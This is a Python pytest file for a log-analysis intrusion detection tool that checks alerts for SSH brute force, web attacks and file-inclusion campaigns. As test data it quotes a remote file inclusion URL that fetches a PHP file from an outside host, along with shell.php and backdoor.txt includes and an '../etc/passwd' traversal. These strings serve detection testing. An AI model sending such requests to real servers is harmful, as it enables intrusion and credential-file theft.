import json
from pathlib import Path

import pytest

from logsentry import store
from logsentry.cli import main

FIXTURES = Path(__file__).parent / "fixtures"


def test_help_exits_cleanly(capsys):
    with pytest.raises(SystemExit) as exc:
        main(["--help"])
    assert exc.value.code == 0
    assert "MITRE ATT&CK" in capsys.readouterr().out


CONFIG = Path(__file__).parent.parent / "config" / "rules.yaml"


@pytest.mark.parametrize(
    ("fixture", "source", "expected"),
    [
        ("auth_bruteforce.log", "sshd", {"ssh_bruteforce", "password_spray"}),
        ("auth_spray.log", "sshd", {"password_spray"}),
        ("auth_success_after_fail.log", "sshd", {"success_after_failures"}),
        ("auth_benign.log", "sshd", set()),
        ("nginx_attacks.log", "nginx", {"web_attack"}),
        ("nginx_scan.log", "nginx", {"web_scan", "web_attack"}),
        ("nginx_benign.log", "nginx", set()),
        ("iis_attacks.log", "iis", {"web_attack"}),
        ("iis_benign.log", "iis", set()),
    ],
)
def test_ingest_stores_and_prints_expected_alerts(tmp_path, capsys, fixture, source, expected):
    db = tmp_path / "t.db"
    argv = ["ingest", str(FIXTURES / fixture), "--source", source, "--config", str(CONFIG)]
    assert main([*argv, "--db", str(db)]) == 0
    rows = store.connect(db).execute("SELECT rule_id FROM alerts").fetchall()
    assert {r["rule_id"] for r in rows} == expected
    assert capsys.readouterr().out.endswith(f"{len(rows)} alert(s)\n")


def ingest_rfi(tmp_path, *extra):
    db = tmp_path / "t.db"
    argv = ["ingest", str(FIXTURES / "apache_access_rfi.log"), "--source", "nginx"]
    assert main([*argv, "--config", str(CONFIG), "--db", str(db), *extra]) == 0
    rows = store.connect(db).execute("SELECT src_ip, severity, outcome FROM alerts").fetchall()
    return {r["src_ip"]: (r["severity"], r["outcome"]) for r in rows}


def test_ingest_with_error_log_judges_outcomes(tmp_path, capsys):
    stored = ingest_rfi(tmp_path, "--error-log", str(FIXTURES / "apache_error_rfi.log"))
    # RFI base high, path traversal medium: +1 when it succeeded, -1 when blocked
    assert stored == {
        "203.0.113.22": ("medium", "failed"),  # RFI blocked (the include failed)
        "203.0.113.23": ("critical", "succeeded"),  # RFI proven by the error_log
        "203.0.113.24": ("high", "succeeded"),  # LFI proven
        "203.0.113.25": ("medium", "unknown"),  # 302, error_log doesn't cover it: blocked
        "203.0.113.26": ("high", "unknown"),  # Perl: no proof, but a 2xx of unusual size
        "203.0.113.27": ("critical", "succeeded"),  # the 2nd request worked
        "203.0.113.28": ("critical", "succeeded"),
    }
    out = capsys.readouterr().out
    assert "apache_error_rfi.log: 1 malformed line(s) skipped" in out
    assert "outcome=failed\n    12:49:40 /rfi/view.php?page=http://198.51.100.5/dataex.php" in out
    assert "\n      error_log (URL match): HTTP request failed!" in out


def test_ingest_counts_the_requests_a_web_alert_grouped(tmp_path):
    db = tmp_path / "t.db"
    argv = ["ingest", str(FIXTURES / "apache_access_rfi.log"), "--source", "nginx"]
    assert main([*argv, "--config", str(CONFIG), "--db", str(db)]) == 0
    row = (
        store.connect(db)
        .execute("SELECT * FROM alerts WHERE src_ip = ?", ("203.0.113.27",))
        .fetchone()
    )
    assert row["event_count"] == 2  # the 2nd request fell in the first one's cooldown
    assert row["summary"] == "Remote file inclusion in 2 requests from 203.0.113.27 (HTTP 302)"
    assert [m["matched"] for m in json.loads(row["matches"])] == [
        "=http://198.51.100.5/fail.php",
        "=http://198.51.100.5/win.php",
    ]
    assert row["last_seen"] == "2024-07-28T17:07:00+00:00"


def test_ingest_without_error_log_leaves_outcomes_unknown(tmp_path):
    stored = ingest_rfi(tmp_path)
    assert set(stored.values()) == {("medium", "unknown"), ("high", "unknown")}  # LFI got a 200


def test_error_log_needs_an_access_log_source(tmp_path, capsys):
    argv = ["ingest", str(FIXTURES / "auth_benign.log"), "--source", "sshd", "--error-log", "x"]
    with pytest.raises(SystemExit):
        main(argv)
    assert "--error-log needs --source nginx" in capsys.readouterr().err


def test_ingest_groups_the_rfi_fixture_ips_into_one_campaign(tmp_path, capsys):
    db = tmp_path / "t.db"
    argv = ["ingest", str(FIXTURES / "apache_access_rfi.log"), "--source", "nginx"]
    assert main([*argv, "--config", str(CONFIG), "--db", str(db)]) == 0
    conn = store.connect(db)
    ids = dict(conn.execute("SELECT src_ip, campaign_id FROM alerts").fetchall())
    # .25 comes at 14:00, 47 min after the others stopped (13:13): not part of it
    assert ids.pop("203.0.113.25") is None
    (campaign_id,) = set(ids.values())  # 6 IPs of one /24 between 12:49 and 13:13
    campaign = store.get_campaign(conn, campaign_id)
    assert (campaign["subnet"], campaign["ip_count"]) == ("203.0.113.0/24", 6)
    assert "1 campaign(s)\n" in capsys.readouterr().out


def test_campaign_fixture_shows_a_succeeded_rfi_chain_and_a_campaign(tmp_path, capsys):
    # The demo fixture (docs screenshots): 4 IPs of one /24 run file inclusions minutes
    # apart, so they group into one campaign; the error_log confirms which ones worked.
    db = tmp_path / "t.db"
    access = FIXTURES / "apache_access_campaign.log"
    error = FIXTURES / "apache_error_campaign.log"
    argv = ["ingest", str(access), "--source", "nginx", "--config", str(CONFIG), "--db", str(db)]
    assert main([*argv, "--error-log", str(error)]) == 0
    conn = store.connect(db)
    rows = {
        r["src_ip"]: r
        for r in conn.execute("SELECT src_ip, severity, outcome, campaign_id, results FROM alerts")
    }
    assert {ip: (r["severity"], r["outcome"]) for ip, r in rows.items()} == {
        "203.0.113.40": ("critical", "succeeded"),  # shell.php include, proven by the error_log
        "203.0.113.41": ("critical", "succeeded"),  # backdoor.txt include, proven
        "203.0.113.42": ("medium", "failed"),  # probe.php include logged as failed
        "203.0.113.43": ("high", "succeeded"),  # ../etc/passwd LFI, no failure logged
    }
    # the succeeded RFI leads to the ingress-transfer + web-shell follow-on chain
    hero = json.loads(rows["203.0.113.40"]["results"])[0]
    assert hero["follow_on"] == ["T1105", "T1505.003"]
    (campaign_id,) = {r["campaign_id"] for r in rows.values()}
    assert store.get_campaign(conn, campaign_id)["ip_count"] == 4
    assert "1 campaign(s)\n" in capsys.readouterr().out
